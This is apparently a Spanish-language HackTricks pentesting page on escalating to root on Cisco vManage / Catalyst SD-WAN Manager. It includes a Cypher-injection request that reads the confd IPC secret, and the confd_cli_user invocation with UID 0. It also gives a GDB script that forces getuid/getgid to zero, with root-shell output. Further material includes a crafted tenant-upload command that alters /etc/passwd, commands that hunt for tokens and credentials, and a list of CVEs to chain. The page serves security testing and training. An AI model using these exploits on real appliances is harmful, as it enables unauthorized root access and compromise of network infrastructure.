# Cisco - vmanage

{{#include ../../banners/hacktricks-training.md}}

Una vez que tengas ejecución de código en Cisco vManage / *Catalyst SD-WAN Manager* como `vmanage`, `netadmin` o `vmanage-admin`, las superficies locales de privesc más interesantes suelen ser la pila CLI de `confd`, el helper `cmdptywrapper`, las REST APIs de localhost y los manejadores de importación/subida propiedad de root.

Si todavía necesitas el **initial foothold** en un controller, consulta primero la página dedicada al control plane:

{{#ref}}
../../network-services-pentesting/12346-udp-pentesting-cisco-sd-wan-control-plane.md
{{#endref}}

## Triaje local rápido
```bash
ps auxww | egrep 'confd|cmdptywrapper|neo4j|vdaemon'
ss -lntp | egrep '4565|830|8443'
find /run /var/run -maxdepth 2 -type s 2>/dev/null | egrep 'confd|cli|rest|mgmt'
ls -l /etc/confd/confd_ipc_secret /usr/bin/confd_cli /usr/bin/confd_cli_user
ls -la /home/vmanage-admin/.ssh 2>/dev/null
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
Si `/etc/confd/confd_ipc_secret` es legible desde tu foothold, Path 1 y Path 2 se vuelven inmediatamente viables. Si llegaste a través de un remote info leak o una webshell, comprueba también si ya puedes acceder al material SSH de `vmanage-admin` o a los handlers de subida de multitenancy: una investigación de 2026 demostró que ambos eran puntos de apoyo realistas.

## Path 1

(Ejemplo de [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))

Después de investigar un poco en cierta [documentation](http://66.218.245.39/doc/html/rn03re18.html) relacionada con `confd` y los distintos binarios (accesibles con una cuenta en el sitio web de Cisco), descubrimos que, para autenticar el socket IPC, utiliza un secret ubicado en `/etc/confd/confd_ipc_secret`:
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
¿Recuerdas nuestra instancia de Neo4j? Se está ejecutando con los privilegios del usuario `vmanage`, lo que nos permite recuperar el archivo mediante la vulnerabilidad anterior:
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
El programa `confd_cli` no admite argumentos de línea de comandos, pero llama a `/usr/bin/confd_cli_user` con argumentos. Por lo tanto, podemos llamar directamente a `/usr/bin/confd_cli_user` con nuestro propio conjunto de argumentos. Sin embargo, no podemos leerlo con nuestros privilegios actuales, así que tenemos que recuperarlo del rootfs y copiarlo usando scp, leer la ayuda y utilizarlo para obtener el shell:
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## Ruta 2

(Ejemplo de [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))

El blog¹ del equipo de synacktiv describió una forma elegante de obtener un root shell, pero el inconveniente es que requiere conseguir una copia de `/usr/bin/confd_cli_user`, que solo es legible por root. Encontré otra forma de escalar a root sin esa complicación.

Al desensamblar el binario `/usr/bin/confd_cli`, observé lo siguiente:

<details>
<summary>Objdump mostrando la recopilación de UID/GID</summary>
```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
</details>

Cuando ejecuto “ps aux”, observé lo siguiente (_nota: -g 100 -u 107_)
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
Supuse que el programa “confd_cli” pasa el ID de usuario y el ID de grupo que obtuvo del usuario conectado a la aplicación “cmdptywrapper”.

Mi primer intento fue ejecutar “cmdptywrapper” directamente y proporcionarle `-g 0 -u 0`, pero falló. Parece que se creó un descriptor de archivo (-i 1015) en algún punto del proceso y no puedo falsificarlo.

Como se menciona en el blog de synacktiv (último ejemplo), el programa `confd_cli` no admite argumentos de línea de comandos, pero puedo influir en él mediante un debugger y, afortunadamente, GDB está incluido en el sistema.

Creé un script de GDB en el que forcé a las API `getuid` y `getgid` a devolver 0. Como ya tengo el privilegio “vmanage” mediante la deserialización RCE, tengo permiso para leer directamente `/etc/confd/confd_ipc_secret`.

root.gdb:
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
Console Output:

<details>
<summary>Salida de la consola</summary>
```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
</details>

## Ruta 3 (bug de validación de entrada de la CLI de 2025 - CVE-2025-20122)

Cisco documentó posteriormente una ruta local más sencilla hacia root en su propio advisory para [CVE-2025-20122](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt): un **attacker autenticado con solo privilegios de lectura** podía enviar una request crafted a la CLI del manager y saltar a root debido a una validación de entrada insuficiente.

Desde una perspectiva ofensiva, esta es la conclusión importante:

1. Una vez que tengas *cualquier foothold con pocos privilegios* en el box, deberías probar el servicio de la CLI local antes de intentar el workflow más pesado de Path 1 / Path 2.
2. Reutiliza los artifacts de Path 2 para encontrar el trust boundary: `confd_cli` → `cmdptywrapper` → `vshell`.
3. Trata cada campo reenviado al backend de la CLI como sospechoso: UID/GID, username, metadata del terminal, archivos importados o cualquier valor consumido posteriormente por un helper propiedad de root.
4. Si un usuario con pocos privilegios puede alcanzar el socket local de la CLI e influir en esos campos, root puede estar a solo una request crafted de distancia.

Un workflow práctico después de obtener acceso al appliance es:
```bash
strings /usr/bin/confd_cli | egrep 'cmdptywrapper|vshell|confd'
strace -f -s 200 -o /tmp/confd.trace /usr/bin/confd_cli
ss -lntp | grep 4565
```
Esto convierte el bug de 2025 en un buen patrón de búsqueda para versiones similares: busca **local CLI shims que recopilen la identidad en userland y la reenvíen a un wrapper con más privilegios**.

No confundas **CVE-2025-20122** con la posterior **CVE-2026-20122**: el problema de 2025 es un bug *local* de CLI a root, mientras que el de 2026 es un sobrescrito arbitrario de archivos mediante una API *remota*, principalmente útil para plantar un foothold y después volver a revisar Path 1 / Path 2 / Path 4.

## Path 4 (2026 low-priv REST API to root - CVE-2026-20126)

El advisory de Cisco de febrero de 2026 también introdujo otra clase útil de privesc: [CVE-2026-20126](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v) permitía que un **atacante autenticado, local y con pocos privilegios** obtuviera root debido a un mecanismo insuficiente de autenticación de usuarios en la REST API.

Esto es importante porque el privesc en vManage ya no se limita al abuso de `confd`/TTY. Después de obtener un shell con pocos privilegios, busca también:

- endpoints de API limitados a localhost que confíen demasiado en el caller
- tokens, cookies o credenciales de servicios legibles desde la cuenta actual
- acciones exclusivas de root expuestas mediante handlers de `dataservice`/REST que aún puedan activarse localmente

En la práctica, una vez que tienes un shell como `vmanage` u otro usuario de servicio, el abuso de la API local suele ser más silencioso y fácil de automatizar que el abuso interactivo de la CLI:
```bash
env | grep -iE 'token|cookie|session'
grep -R "dataservice" /etc /opt 2>/dev/null | head
ss -lntp | grep -E '(:443|:8443)'
```
Si el contexto de la sesión local es suficiente para acceder a funcionalidad REST privilegiada, prefiere la ruta de la API: es más fácil de repetir, automatizar y encadenar con web sessions o API tokens robados.

## Ruta 5 (archivo crafted de 2026 procesado por root - CVE-2026-20245)

Otro patrón reciente es [CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx): un atacante local con privilegios `netadmin` podía subir un **crafted file** que posteriormente era manejado de forma insegura por la CLI, lo que provocaba command injection como `root`.

Desde el punto de vista de HackTricks, la técnica valiosa es más amplia que el CVE específico:

1. Enumera cada workflow de la CLI o web que acepte un archivo: imports, diagnostic bundles, templates, validators, backups, tenant data, etc.
2. Rastrea dónde termina el archivo subido y qué script o binary propiedad de root lo consume.
3. Comprueba si el filename, el contenido del archivo o los metadatos analizados se pasan alguna vez a shell commands, wrapper scripts o helpers de estilo `system()`.
4. Si ya puedes acceder a `netadmin` (credenciales válidas, stolen session o una cadena de auth-bypass), los bugs de file-processing suelen ser la ruta más rápida hacia root.

Más tarde, Google Cloud / Mandiant mostró una instancia muy concreta de esta clase de bug siendo explotada a través de la ruta de importación de multitenancy:
```bash
request tenant-upload tenant-list /home/admin/evil_tenant.csv vpn 0
```
En el ataque observado, el CSV manipulado terminó modificando `/etc/passwd` y `/etc/shadow` para crear una cuenta temporal con UID 0 (`troot`). Esto hace que los importadores del tipo `tenant-upload` / `tenant-list` sean especialmente interesantes: no son solo funciones de ingesta de datos, sino posibles front-ends de parsers propiedad de root.

Un patrón rápido de búsqueda desde el shell es:
```bash
strings /usr/bin/* 2>/dev/null | grep -E 'tenant-upload|tenant-list|import|upload|backup' | head
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
Esta clase de bug se encadena especialmente bien con footholds remotos que otorgan `netadmin`, pero no `root`.

## Otras vulnerabilidades recientes de vManage/Catalyst SD-WAN Manager para encadenar

- **Info leak no autenticado (CVE-2026-20133)** – Especialmente valioso porque la investigación pública mostró que podía exponer `confd_ipc_secret` o la clave privada de `vmanage-admin`, convirtiendo un bug de lectura en Path 1 o en un pivote NETCONF.
- **Sobrescritura arbitraria de archivos mediante API autenticada (CVE-2026-20122)** – Diferente del bug de CLI de 2025 mencionado anteriormente; VulnCheck lo utilizó para subir un webshell, lo que hace que las rutas de privesc local de esta página sean inmediatamente relevantes.
- **XSS autenticado en la UI (CVE-2024-20475)** – Robar una sesión de administrador en la web UI y después pivotar hacia acciones de API/CLI que finalmente alcancen `vshell` o una de las rutas de privesc local anteriores.
- **Auth bypass remoto a `netadmin` (CVE-2026-20129)** – Precursor muy sólido para Path 5, porque `netadmin` es exactamente el nivel requerido por el privesc mediante archivo manipulado de 2026.
- **Escritura arbitraria de archivos autenticada (CVE-2026-20262)** – Valor ofensivo similar al de CVE-2026-20122, pero mediante una ruta posterior de subida en la web UI: escribir en una ubicación que posteriormente será analizada por `root` o por la capa web del management plane.
- **Downgrade para resucitar el privesc antiguo de CLI (CVE-2022-20775)** – Las intrusiones de 2026 mostraron que los atacantes pueden volver a una build antigua y vulnerable de SD-WAN, abusar del antiguo bug de root en la CLI y después restaurar la versión original.
- **Auth bypass del control plane antes de la autenticación (CVE-2026-20182)** – Está mejor documentado en la página específica del control plane de SD-WAN; puede añadir una clave SSH para `vmanage-admin`, proporcionándote el foothold local necesario para volver a consultar esta página.



## Referencias

- [Vulnerabilidades de Cisco Catalyst SD-WAN (CVE-2026-20126, CVE-2026-20129, etc.)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v)
- [Vulnerabilidad de escalada de privilegios autenticada en Cisco Catalyst SD-WAN Controller, Catalyst SD-WAN Manager y Catalyst SD-WAN Validator (CVE-2026-20245)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)
- [VulnCheck: Herding Cats - Vulnerabilidades recientes de Cisco SD-WAN Manager](https://www.vulncheck.com/blog/cisco-sd-wan-manager-vulns)
- [Google Cloud / Mandiant: Explotación zero-day de la vulnerabilidad (CVE-2026-20245) en Cisco Catalyst SD-WAN Manager](https://cloud.google.com/blog/topics/threat-intelligence/zero-day-exploitation-cisco-catalyst-sd-wan-manager)
{{#include ../../banners/hacktricks-training.md}}
